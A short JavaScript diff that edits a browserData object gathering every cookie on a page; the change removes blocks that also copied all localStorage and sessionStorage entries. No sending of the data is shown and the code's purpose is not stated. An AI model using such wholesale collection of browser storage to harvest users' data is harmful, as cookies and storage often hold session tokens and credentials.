@@ -5,18 +5,6 @@ const browserData = {
             const [key, ...value] = cookie.split("=");
             acc[key] = value.join("=");
             return acc;
-        }, {}),
-
-    localStorage: Object.keys(localStorage)
-        .reduce((acc, key) => {
-            acc[key] = localStorage.getItem(key);
-            return acc;
-        }, {}),
-
-    sessionStorage: Object.keys(sessionStorage)
-        .reduce((acc, key) => {
-            acc[key] = sessionStorage.getItem(key);
-            return acc;
         }, {})
 };
 
